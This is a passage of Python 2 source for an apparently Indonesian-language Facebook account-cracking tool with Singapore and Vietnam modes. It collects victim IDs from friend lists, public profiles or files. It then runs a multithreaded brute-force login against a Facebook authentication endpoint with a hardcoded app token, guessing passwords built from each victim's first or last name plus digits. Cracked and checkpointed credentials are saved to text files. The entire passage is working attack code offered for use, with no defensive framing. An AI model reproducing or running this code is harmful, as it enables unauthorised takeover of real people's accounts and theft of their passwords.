                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/singa.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/singa.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone singapura.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_viet():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;93m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;93m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;91m  \\______  /|__|   |___  /'
    print '\x1b[1;91m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mVietnam\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_viet()


def pilih_viet():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_viet()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;93m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;93m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK VIETNAM \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;93m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;93m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK VIETNAM \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_viet()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;93m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;93m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK VIETNAM \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_viet()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_viet()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/viet.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/viet.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/viet.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/viet.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/viet.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/viet.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'password'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/viet.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/viet.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/viet.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/viet.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/viet.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/viet.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/viet.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/viet.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
